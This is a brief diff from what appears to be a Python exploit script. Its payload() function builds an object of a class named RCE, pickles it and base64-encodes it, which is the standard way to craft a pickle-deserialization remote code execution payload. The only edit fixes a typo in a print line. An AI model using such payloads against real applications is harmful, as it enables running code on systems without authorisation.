@@ -43,7 +43,7 @@ def payload():
 
     my_layout=RCE()
 
-    print("typeof mylayout:",type(my_layout))
+    print("typeof my_layout:",type(my_layout))
     my_layout=pickle.dumps(my_layout)
     my_layout=base64.b64encode(my_layout)
     my_layout=str(my_layout,'utf-8')
